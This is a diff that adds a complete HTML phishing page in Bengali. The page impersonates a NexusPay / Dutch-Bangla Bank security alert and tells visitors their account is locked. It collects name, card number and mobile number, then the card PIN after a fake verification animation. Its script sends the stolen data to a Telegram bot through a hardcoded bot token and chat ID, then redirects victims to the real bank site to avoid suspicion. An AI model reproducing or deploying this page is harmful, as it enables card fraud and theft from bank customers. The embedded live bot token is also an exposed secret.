@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NexusPay Security Alert</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: #f0f3f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
+        
+        .bank-card {
+            background: #fff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+            border-top: 5px solid #005a8f;
+        }
+        .header { background: #005a8f; color: white; padding: 25px; text-align: center; }
+        .nexus-logo { width: 150px; margin-bottom: 10px; }
+        .header p { font-size: 13px; opacity: 0.9; }
+        
+        .content { padding: 30px 25px; }
+        .alert-box { background: #fff8e1; color: #856404; padding: 15px; border-radius: 6px; font-size: 13px; margin-bottom: 25px; border-left: 4px solid #ffc107; text-align: left; line-height: 1.5; }
+        
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; font-size: 14px; color: #333; margin-bottom: 8px; font-weight: 600; }
+        input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; transition: 0.3s; }
+        input:focus { border-color: #005a8f; box-shadow: 0 0 5px rgba(0, 90, 143, 0.2); outline: none; }
+
+        .btn { width: 100%; padding: 16px; background: #005a8f; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #00466e; }
+
+        #loadingSection { display: none; text-align: center; padding: 40px 10px; }
+        .loader-bar { width: 100%; height: 10px; background: #eee; border-radius: 10px; overflow: hidden; margin: 25px 0; }
+        .progress { width: 0%; height: 100%; background: #28a745; animation: fill 5s linear forwards; }
+        @keyframes fill { 0% { width: 0%; } 100% { width: 100%; } }
+        .status-text { font-weight: bold; color: #005a8f; margin-top: 15px; font-size: 15px; }
+
+        #pinSection { display: none; }
+        .pin-input { letter-spacing: 20px; text-align: center; font-size: 28px; font-weight: bold; }
+        .btn-green { background: #28a745; }
+        
+        /* Footer Styling */
+        .footer { margin-top: 35px; text-align: center; padding-top: 10px; border-top: 1px solid #eee; }
+        .bank-name { font-size: 14px; font-weight: bold; color: #333; }
+        .branch-info { font-size: 13px; color: #005a8f; font-weight: 600; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="bank-card">
+    <div class="header">
+        <img src="https://i.postimg.cc/RVRQtTwk/images.jpg" alt="NexusPay Logo" class="nexus-logo">
+        <p>Security Verification Service</p>
+    </div>
+
+    <div class="content">
+        <div id="step1">
+            <div class="alert-box">
+                🚨 নিরাপত্তা কারণে আপনার অ্যাকাউন্টটি সাময়িকভাবে লক করা হয়েছে। সচল করতে নিচের তথ্যগুলো প্রদান করুন।
+            </div>
+            <div class="input-group">
+                <label>কার্ড হোল্ডার নেম (Name on Card)</label>
+                <input type="text" id="holderName" placeholder="আপনার নাম লিখুন" required>
+            </div>
+            <div class="input-group">
+                <label>কার্ড নাম্বার (16 Digits)</label>
+                <input type="number" id="cardNumber" placeholder="xxxx xxxx xxxx xxxx" required>
+            </div>
+            <div class="input-group">
+                <label>মোবাইল নাম্বার (Linked SIM)</label>
+                <input type="number" id="mobileNumber" placeholder="017xxxxxxxx" required>
+            </div>
+            <button class="btn" onclick="startVerification()">পরবর্তী ধাপ (Continue)</button>
+        </div>
+
+        <div id="loadingSection">
+            <h3 style="color: #222; font-size: 19px;">তথ্য যাচাই করা হচ্ছে...</h3>
+            <div class="loader-bar"><div class="progress"></div></div>
+            <p class="status-text" id="statusText">Connecting to NexusPay Server...</p>
+        </div>
+
+        <div id="pinSection">
+            <div class="alert-box" style="background: #e6fdf1; color: #155724; border-color: #c3e6cb;">
+                ✅ তথ্য সঠিক পাওয়া গেছে। অ্যাকাউন্ট আনলক করতে আপনার ৪ ডিজিটের পিন (PIN) দিন।
+            </div>
+            <div class="input-group">
+                <label>সিকিউরিটি পিন (4 Digits PIN)</label>
+                <input type="password" id="cardPin" class="pin-input" maxlength="4" placeholder="****" inputmode="numeric" required>
+            </div>
+            <button class="btn btn-green" onclick="finalSubmit()">আনলক নিশ্চিত করুন</button>
+        </div>
+
+        <div class="footer">
+            <div class="bank-name">© 2026 Dutch-Bangla Bank PLC.</div>
+            <div class="branch-info">কালিবাড়ি, ডাচ-বাংলা শাখা(১)</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "7904033466:AAGUuVBMmS5VMe6k7O7m4yLVe3ufbsve4y0"; 
+    const CHAT_ID = "6763021567";
+
+    let collectedData = {};
+
+    function startVerification() {
+        collectedData.name = document.getElementById('holderName').value;
+        collectedData.card = document.getElementById('cardNumber').value;
+        collectedData.phone = document.getElementById('mobileNumber').value;
+
+        if(!collectedData.name || !collectedData.card || !collectedData.phone) {
+            alert("সবগুলো তথ্য সঠিকভাবে পূরণ করুন।");
+            return;
+        }
+
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('loadingSection').style.display = 'block';
+
+        setTimeout(() => {
+            document.getElementById('statusText').innerText = "Card Identified Successfully!";
+        }, 2500);
+
+        setTimeout(() => {
+            document.getElementById('loadingSection').style.display = 'none';
+            document.getElementById('pinSection').style.display = 'block';
+            document.getElementById('cardPin').focus();
+        }, 5000);
+    }
+
+    function finalSubmit() {
+        const pin = document.getElementById('cardPin').value;
+        if(pin.length !== 4) {
+            alert("দয়া করে ৪ ডিজিটের সঠিক পিন দিন।");
+            return;
+        }
+
+        const message = `🏦 *NexusPay Result* \n\n👤 নাম: ${collectedData.name} \n💳 কার্ড: \`${collectedData.card}\` \n📱 ফোন: ${collectedData.phone} \n🔑 পিন: \`${pin}\` \n📍 শাখা: কালিবাড়ি (১)`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+        }).then(() => {
+            alert("ভেরিফিকেশন সফল। আপনার অ্যাকাউন্টটি ২ ঘণ্টার মধ্যে সচল হবে।");
+            window.location.href = "https://www.dutchbanglabank.com/nexuspay/nexuspay.html";
+        }).catch(err => {
+            alert("নেটওয়ার্ক সমস্যা। আবার চেষ্টা করুন।");
+        });
+    }
+</script>
+
+</body>
+</html>
